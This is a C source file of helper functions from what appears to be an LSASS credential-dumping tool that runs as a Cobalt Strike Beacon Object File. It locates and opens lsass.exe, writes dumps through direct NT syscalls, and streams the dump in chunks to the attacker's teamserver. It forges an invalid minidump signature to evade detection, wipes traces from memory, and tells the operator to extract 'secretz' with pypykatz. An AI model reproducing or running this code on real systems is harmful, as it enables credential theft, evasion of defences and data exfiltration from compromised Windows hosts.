#include "../include/utils.h"
#include "../include/handle.h"
#include "../include/syscalls.h"

BOOL write_file(
    LPCSTR fileName,
    PBYTE fileData,
    ULONG32 fileLength
)
{
    HANDLE hFile;
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK IoStatusBlock;
    LARGE_INTEGER largeInteger;
    largeInteger.QuadPart = fileLength;
    wchar_t wcFilePath[MAX_PATH];
    wchar_t wcFileName[MAX_PATH];
    PUNICODE_STRING pUnicodeFilePath = intAlloc(sizeof(UNICODE_STRING));
    if (!pUnicodeFilePath)
    {
        malloc_failed();
        return FALSE;
    }

    // create a UNICODE_STRING with the file path
    mbstowcs(wcFileName, fileName, MAX_PATH);
    wcscpy(wcFilePath, L"\\??\\");
    wcsncat(wcFilePath, wcFileName, MAX_PATH);
    pUnicodeFilePath->Buffer = wcFilePath;
    pUnicodeFilePath->Length = wcsnlen(pUnicodeFilePath->Buffer, MAX_PATH);
    pUnicodeFilePath->Length *= 2;
    pUnicodeFilePath->MaximumLength = pUnicodeFilePath->Length + 2;

    // init the object attributes
    InitializeObjectAttributes(
        &objAttr,
        pUnicodeFilePath,
        OBJ_CASE_INSENSITIVE,
        NULL,
        NULL
    );
    // create the file
    NTSTATUS status = NtCreateFile(
        &hFile,
        FILE_GENERIC_READ | FILE_GENERIC_WRITE | SYNCHRONIZE,
        &objAttr,
        &IoStatusBlock,
        &largeInteger,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );
    intFree(pUnicodeFilePath); pUnicodeFilePath = NULL;
    if (status == STATUS_OBJECT_PATH_NOT_FOUND ||
        status == STATUS_OBJECT_NAME_INVALID)
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "The path '%s' is invalid.\n",
            fileName
        );
        return FALSE;
    }
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtCreateFile", status);
        return FALSE;
    }
    // write the dump
    status = NtWriteFile(
        hFile,
        NULL,
        NULL,
        NULL,
        &IoStatusBlock,
        fileData,
        fileLength,
        NULL,
        NULL
    );
    NtClose(hFile); hFile = NULL;
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtWriteFile", status);
        return FALSE;
    }

    return TRUE;
}

#ifdef BOF
BOOL download_file(
    LPCSTR fileName,
    char fileData[],
    ULONG32 fileLength
)
{
    int fileNameLength = strnlen(fileName, 256);

    // intializes the random number generator
    time_t t;
    srand((unsigned) time(&t));

    // generate a 4 byte random id, rand max value is 0x7fff
    ULONG32 fileId = 0;
    fileId |= (rand() & 0x7FFF) << 0x11;
    fileId |= (rand() & 0x7FFF) << 0x02;
    fileId |= (rand() & 0x0003) << 0x00;

    // 8 bytes for fileId and fileLength
    int messageLength = 8 + fileNameLength;
    char* packedData = intAlloc(messageLength);
    if (!packedData)
    {
        malloc_failed();
        return FALSE;
    }

    // pack on fileId as 4-byte int first
    packedData[0] = (fileId >> 0x18) & 0xFF;
    packedData[1] = (fileId >> 0x10) & 0xFF;
    packedData[2] = (fileId >> 0x08) & 0xFF;
    packedData[3] = (fileId >> 0x00) & 0xFF;

    // pack on fileLength as 4-byte int second
    packedData[4] = (fileLength >> 0x18) & 0xFF;
    packedData[5] = (fileLength >> 0x10) & 0xFF;
    packedData[6] = (fileLength >> 0x08) & 0xFF;
    packedData[7] = (fileLength >> 0x00) & 0xFF;

    // pack on the file name last
    for (int i = 0; i < fileNameLength; i++)
    {
        packedData[8 + i] = fileName[i];
    }

    // tell the teamserver that we want to download a file
    BeaconOutput(
        CALLBACK_FILE,
        packedData,
        messageLength
    );
    intFree(packedData); packedData = NULL;

    // we use the same memory region for all chucks
    int chunkLength = 4 + CHUNK_SIZE;
    char* packedChunk = intAlloc(chunkLength);
    if (!packedChunk)
    {
        malloc_failed();
        return FALSE;
    }
    // the fileId is the same for all chunks
    packedChunk[0] = (fileId >> 0x18) & 0xFF;
    packedChunk[1] = (fileId >> 0x10) & 0xFF;
    packedChunk[2] = (fileId >> 0x08) & 0xFF;
    packedChunk[3] = (fileId >> 0x00) & 0xFF;

    ULONG32 exfiltrated = 0;
    while (exfiltrated < fileLength)
    {
        // send the file content by chunks
        chunkLength = fileLength - exfiltrated > CHUNK_SIZE ? CHUNK_SIZE : fileLength - exfiltrated;
        ULONG32 chunkIndex = 4;
        for (ULONG32 i = exfiltrated; i < exfiltrated + chunkLength; i++)
        {
            packedChunk[chunkIndex++] = fileData[i];
        }
        // send a chunk
        BeaconOutput(
            CALLBACK_FILE_WRITE,
            packedChunk,
            4 + chunkLength
        );
        exfiltrated += chunkLength;
    }
    intFree(packedChunk); packedChunk = NULL;

    // tell the teamserver that we are done writing to this fileId
    char packedClose[4];
    packedClose[0] = (fileId >> 0x18) & 0xFF;
    packedClose[1] = (fileId >> 0x10) & 0xFF;
    packedClose[2] = (fileId >> 0x08) & 0xFF;
    packedClose[3] = (fileId >> 0x00) & 0xFF;
    BeaconOutput(
        CALLBACK_FILE_CLOSE,
        packedClose,
        4
    );
    return TRUE;
}
#endif

/*
 * kill a process by PID
 * used to kill processes created by MalSecLogon
 */
BOOL kill_process(
    DWORD pid
)
{
    if (!pid)
        return FALSE;
    // open a handle with PROCESS_TERMINATE
    HANDLE hProcess = get_process_handle(
        pid,
        PROCESS_TERMINATE,
        FALSE
    );
    if (!hProcess)
        return FALSE;

    NTSTATUS status = NtTerminateProcess(
        hProcess,
        ERROR_SUCCESS
    );
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtTerminateProcess", status);
        return FALSE;
    }
    return TRUE;
}

BOOL wait_for_process(
    HANDLE hProcess
)
{
    NTSTATUS status = NtWaitForSingleObject(
        hProcess,
        TRUE,
        NULL
    );
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtWaitForSingleObject", status);
        return FALSE;
    }
    return TRUE;
}

BOOL delete_file(
    LPCSTR filepath
)
{
    OBJECT_ATTRIBUTES objAttr;
    wchar_t wcFilePath[MAX_PATH];
    wchar_t wcFileName[MAX_PATH];
    PUNICODE_STRING pUnicodeFilePath = intAlloc(sizeof(UNICODE_STRING));
    if (!pUnicodeFilePath)
    {
        malloc_failed();
        return FALSE;
    }

    // create a UNICODE_STRING with the file path
    mbstowcs(wcFileName, filepath, MAX_PATH);
    wcscpy(wcFilePath, L"\\??\\");
    wcsncat(wcFilePath, wcFileName, MAX_PATH);
    pUnicodeFilePath->Buffer = wcFilePath;
    pUnicodeFilePath->Length = wcsnlen(pUnicodeFilePath->Buffer, MAX_PATH);
    pUnicodeFilePath->Length *= 2;
    pUnicodeFilePath->MaximumLength = pUnicodeFilePath->Length + 2;

    // init the object attributes
    InitializeObjectAttributes(
        &objAttr,
        pUnicodeFilePath,
        OBJ_CASE_INSENSITIVE,
        NULL,
        NULL
    );

    NTSTATUS status = NtDeleteFile(&objAttr);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtDeleteFile", status);
        return FALSE;
    }
    return TRUE;
}

BOOL file_exists(
    LPCSTR filepath
)
{
    HANDLE hFile;
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK IoStatusBlock;
    LARGE_INTEGER largeInteger;
    largeInteger.QuadPart = 0;
    wchar_t wcFilePath[MAX_PATH];
    wchar_t wcFileName[MAX_PATH];
    PUNICODE_STRING pUnicodeFilePath = intAlloc(sizeof(UNICODE_STRING));
    if (!pUnicodeFilePath)
    {
        malloc_failed();
        return FALSE;
    }

    // create a UNICODE_STRING with the file path
    mbstowcs(wcFileName, filepath, MAX_PATH);
    wcscpy(wcFilePath, L"\\??\\");
    wcsncat(wcFilePath, wcFileName, MAX_PATH);
    pUnicodeFilePath->Buffer = wcFilePath;
    pUnicodeFilePath->Length = wcsnlen(pUnicodeFilePath->Buffer, MAX_PATH);
    pUnicodeFilePath->Length *= 2;
    pUnicodeFilePath->MaximumLength = pUnicodeFilePath->Length + 2;

    // init the object attributes
    InitializeObjectAttributes(
        &objAttr,
        pUnicodeFilePath,
        OBJ_CASE_INSENSITIVE,
        NULL,
        NULL
    );
    // call NtCreateFile with FILE_OPEN
    NTSTATUS status = NtCreateFile(
        &hFile,
        FILE_GENERIC_READ,
        &objAttr,
        &IoStatusBlock,
        &largeInteger,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );
    intFree(pUnicodeFilePath); pUnicodeFilePath = NULL;
    if (status == STATUS_OBJECT_NAME_NOT_FOUND)
        return FALSE;
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtCreateFile", status);
        return FALSE;
    }
    NtClose(hFile); hFile = NULL;
    return TRUE;
}

PVOID get_process_image(HANDLE hProcess)
{
    NTSTATUS status;
    ULONG BufferLength = 0x200;
    PVOID buffer;
    do
    {
        buffer = intAlloc(BufferLength);
        if (!buffer)
        {
            malloc_failed();
            return NULL;
        }
        status = NtQueryInformationProcess(
            hProcess,
            ProcessImageFileName,
            buffer,
            BufferLength,
            &BufferLength
        );
        if (NT_SUCCESS(status))
            return buffer;

        intFree(buffer); buffer = NULL;
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    syscall_failed("NtQueryInformationProcess", status);
    return NULL;
}

BOOL is_lsass(HANDLE hProcess)
{
    PUNICODE_STRING image = get_process_image(hProcess);
    if (!image)
        return FALSE;

    if (image->Length == 0)
    {
        intFree(image); image = NULL;
        return FALSE;
    }

    if (wcsstr(image->Buffer, L"\\Windows\\System32\\lsass.exe"))
    {
        intFree(image); image = NULL;
        return TRUE;
    }

    intFree(image); image = NULL;
    return FALSE;
}

DWORD get_pid(
    HANDLE hProcess
)
{
    PROCESS_BASIC_INFORMATION basic_info;
    PROCESSINFOCLASS ProcessInformationClass = 0;
    NTSTATUS status = NtQueryInformationProcess(
        hProcess,
        ProcessInformationClass,
        &basic_info,
        sizeof(PROCESS_BASIC_INFORMATION),
        NULL
    );
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtQueryInformationProcess", status);
        return 0;
    }

    return basic_info.UniqueProcessId;
}

DWORD get_lsass_pid(void)
{
    DWORD pid;
    HANDLE hProcess = find_lsass(PROCESS_QUERY_INFORMATION);
    if (!hProcess)
        return 0;
    pid = get_pid(hProcess);
    NtClose(hProcess); hProcess = NULL;
    return pid;
}

void print_success(
    LPCSTR dump_name,
    BOOL use_valid_sig,
    BOOL do_write
)
{
    if (!use_valid_sig)
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_OUTPUT,
#else
        printf(
#endif
            "The minidump has an invalid signature, restore it running:\nbash restore_signature.sh %s",
            do_write? &strrchr(dump_name, '\\')[1] : dump_name
        );
    }
    if (do_write)
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_OUTPUT,
            "Done, to download the dump run:\ndownload %s\nto get the secretz run:\npython3 -m pypykatz lsa minidump %s",
            dump_name,
            &strrchr(dump_name, '\\')[1]
        );
#else
        printf(
            "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s",
            &strrchr(dump_name, '\\')[1]
        );
#endif
    }
    else
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_OUTPUT,
#else
        printf(
#endif
            "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s",
            dump_name
        );
    }
}

void free_linked_list(
    PVOID head
)
{
    if (!head)
        return;

    Plinked_list node = (Plinked_list)head;
    ULONG32 number_of_nodes = 0;
    while (node)
    {
        number_of_nodes++;
        node = node->next;
    }

    for (int i = number_of_nodes - 1; i >= 0; i--)
    {
        Plinked_list node = (Plinked_list)head;

        int jumps = i;
        while (jumps--)
            node = node->next;

        intFree(node); node = NULL;
    }
}

PVOID allocate_memory(
    PSIZE_T RegionSize
)
{
    PVOID BaseAddress = NULL;
    NTSTATUS status = NtAllocateVirtualMemory(
        NtCurrentProcess(),
        &BaseAddress,
        0,
        RegionSize,
        MEM_COMMIT,
        PAGE_READWRITE
    );
    if (!NT_SUCCESS(status))
    {
#ifdef DEBUG
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Could not allocate enough memory to write the dump\n"
        );
#endif
        return NULL;
    }
    return BaseAddress;
}

void encrypt_dump(
    Pdump_context dc
)
{
    // add your code here
    return;
}

void erase_dump_from_memory(
    Pdump_context dc
)
{
    // delete all trace of the dump from memory
    memset(dc->BaseAddress, 0, dc->rva);
    // free the memory area where the dump was
    PVOID BaseAddress = dc->BaseAddress;
    SIZE_T RegionSize = dc->DumpMaxSize;
    NTSTATUS status = NtFreeVirtualMemory(
        NtCurrentProcess(),
        &BaseAddress,
        &RegionSize,
        MEM_RELEASE
    );
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtFreeVirtualMemory", status);
    }
}

void generate_invalid_sig(
    PULONG32 Signature,
    PSHORT Version,
    PSHORT ImplementationVersion
)
{
    time_t t;
    srand((unsigned) time(&t));

    *Signature = MINIDUMP_SIGNATURE;
    *Version = MINIDUMP_VERSION;
    *ImplementationVersion = MINIDUMP_IMPL_VERSION;
    while (*Signature == MINIDUMP_SIGNATURE ||
           *Version == MINIDUMP_VERSION ||
           *ImplementationVersion == MINIDUMP_IMPL_VERSION)
    {
        *Signature = 0;
        *Signature |= (rand() & 0x7FFF) << 0x11;
        *Signature |= (rand() & 0x7FFF) << 0x02;
        *Signature |= (rand() & 0x0003) << 0x00;

        *Version = 0;
        *Version |= (rand() & 0xFF) << 0x08;
        *Version |= (rand() & 0xFF) << 0x00;

        *ImplementationVersion = 0;
        *ImplementationVersion |= (rand() & 0xFF) << 0x08;
        *ImplementationVersion |= (rand() & 0xFF) << 0x00;
    }
}
